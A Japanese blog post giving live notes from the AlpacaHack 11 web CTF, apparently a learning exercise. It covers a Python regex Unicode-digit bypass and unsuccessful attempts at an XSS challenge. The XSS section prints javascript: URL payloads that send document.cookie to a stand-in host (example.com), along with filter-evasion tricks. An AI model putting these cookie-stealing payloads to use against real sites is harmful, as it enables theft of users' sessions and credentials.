---
type: "post"
title: "AlpacaHack 11 (Web) 実況"
draft: false
description: "悔しい"
ogp: 'ogp-big.webp'
changelog:
  - summary: 記事作成
    date: "2025-05-17T18:51:29.694415104+09:00[Asia/Tokyo]"
---

<!-- titleは自動で入る -->

[Writeupはこちら](https://blog.uta8a.net/post/2025-05-17-alpacahack-11)
ここでは実況を残します

# Jackpot

## コード読んだり手元で動かしたり

- おっ、Slot machineだ。乱数予測かな？
- pythonのrandomって確かメルセンヌツイスタだから予測可能だったような

## コードをよく読む

- choice?なんか雲行き怪しいな。乱数予測じゃないぞ
- これ10桁よりたくさんの文字集めるけどuniqueである必要があるから実質0123456789のpermutationしか書けんやんw
- はー、どうやって7集めるんやこれ
- とりあえずドキュメント読むか「Python regex」で検索して...
  - [re --- 正規表現操作 — Python 3.13.3 ドキュメント](https://docs.python.org/ja/3.13/library/re.html)

## reのドキュメントを読む

- お？Unicodeパターンと8ビットパターンというのがあるのか
- Unicodeパターンだと"その他多数の数字"って書いてあるな
- ASCIIフラグデフォルトで有効になってないんでは？

## 手元で試す

- python3起動して...
- よっしゃ

```text
>>> a = '\u0660'
>>> a
'٠'
>>> not re.fullmatch(r"\d+", a)
False
```

- これで勝てる

## 00...07みたいなのを送る

- お、 `{"code":200,"flag":null,"isJackpot":false,"results":[0,0,7,0,0,0,0,7,0,0,0,0,0,0,0]}` みたいなのが帰ってきた。
- ということは7にしてやれば良さそう
  - `66` みたいな末尾だった `73` ではなく `6d` になることに注意

## 77...77みたいなのを送る

- できた！やったあ！！
- 25分で解けたし割と早い方じゃろう！
- 順位表を見る
- 21solvesすでにおる... みんな早い〜

# Redirector

## 眺める

- XSSかな？Admin Botがおる
- シンプルにCookieを取ってくださいって感じやな

```javascript
    await context.setCookie({
      name: "FLAG",
      value: FLAG,
      domain: APP_HOST,
      path: "/",
    });

    const page = await context.newPage();
    await page.goto(url, { timeout: 5_000 });
    await sleep(5_000);
    await page.close();
```

- サーバの方はなんもないな。fastifyなことは覚えておく。

## ガチャガチャする

- よし、とりあえず `javascript` スキーム突っ込むか

```text
javascript:alert(1)
```

- 行けたわ。勝ったなガハハ
- 後はパズルや

## 観察

- Invalid URL 1の方は英数字アンダースコア丸括弧縛りか
- Invalid URL 2はcookieとかlocationとか色々潰されてる
- とりあえずInvalid URL 1だけを考えてみる。

## 解けない: partsの範囲外に出してみようとする

- [JSFxck](https://jsfuck.com/) だと四角カッコが必要なはず。
- invalid 1ではpartsを見ていて、invalid 2ではurlを見てる
  - url→partsの処理が入るのを利用して両方すり抜けられないか？
- `console.log(parts)` のようなコードをHTMLに書いて観察する

```text
javascript:javascript:location.href=https://example.com?q=document.cookie

0: "javascript:location.href=https://example.com"
1: "?q=document.cookie"
2: ""
```

```text
javascript:location.href=https://example.com?q=document.cookie?q=document.cookie?q=document.cookie?q=document.cookie?q=document.cookie

0: "location.href=https://example.com"
1: "?q=document.cookie?q=document.cookie?q=document.cookie?q=document.cookie?q=document.cookie"
2: ""
```

```text
javascript:location.href=example.com?q1=document.cookie#h1=document.cookie?q2=document.cookie#h2=document.cookie

0: "location.href=example.com"
1: "?q1=document.cookie"
2: "#h1=document.cookie?q2=document.cookie#h2=document.cookie"
```

なるほど。`?` や `#` はむずそう

## 解けない: 1文字目に着目

- partsの処理で、searchとhashは先頭文字が `?` と `#` で固定されるが、pathnameは1文字自由に入れられる。
- 色々入れてみたけどいい感じのがない

## 解けない: 他のURIスキームに注目

- [URI スキーム - URI \| MDN](https://developer.mozilla.org/ja/docs/Web/URI/Reference/Schemes)
- dataとかblobとかみたけどあんまりいいのない
- JavaScriptとして解釈させる必要があるから、 `javascript:` で合ってそう

## 検索

- 「CTF jail js」とかで検索してみる
  - t-chenさんの記事 [jailCTF 2024 - writeup](https://zenn.dev/tchen/articles/5c446d9dbd9920)
  - withstatementというのがある

```text
javascript:with(console)(log)(123)
```

- これは123が出力される。dotはwithStatementでbypassできそう。

```text
javascript:with(console)(log)(with(console)(log)(213))

VM61:1 Uncaught SyntaxError: Unexpected token 'with'Understand this error
```

- これはだめ。

## いっぱい入れてみる

- たくさん入れたら文字数溢れてpartsのvalidateが消えるとかないかな

```text
>>> "javascript:\"" + "a"*20000 + "?b\"+alert(1)"
```

```json
{"error":"Request Header Fields Too Large","message":"Exceeded maximum allowed HTTP header size","statusCode":431}
```

- 実行されなかった...

## 解けない: `//` をつけてみる

- URIスキームで、`//` ってどうなるんだろう

```text
javascript://example.com;alert(123)/hoge?a#b
0: "/hoge"
1: "?a"
2: "#b"
```

- お！好きな文字を入れられそう！！
- 改行するか

```text
javascript://a\nalert("123");:b@example.com/c?d#e
invalid 1は通るが、特に発火しない
```

- なんでや

## 解けない: 色々試す

```text
javascript:with(console)(log(parseInt(__proto__)))
NaN
```

```text
javascript:with(console)(log(undefined))
undefined
```

- そもそもURLにdotが入っているの無理ゲーすぎる
- ん？もしかして数字でIPアドレス入れるやつ使えるか？

```text
127.0.0.1
7f000001

>>> 0x7f000001
2130706433
```

```text
javascript:alert(fetch(2130706433))

http://localhost:3000/2130706433 に行ってしまう
```

## まとめる

- `javascript:alert(fetch(//2130706433))` を通したい
- `javascript:with(document)(fetch(cookie))` みたいなことがしたい
- 数字からserializeする方法ないか？
  - `btoa` とか
- cookieという文字列を使わずになんとか出せないか？
  - `Object.values(window)` とか見てた

## 終わり

- `javascript:with(String)(fetch(fromCodePoint(47)+fromCodePoint(47)+2130706433))` とかが通ればいいんですが...
- 解けませんでした
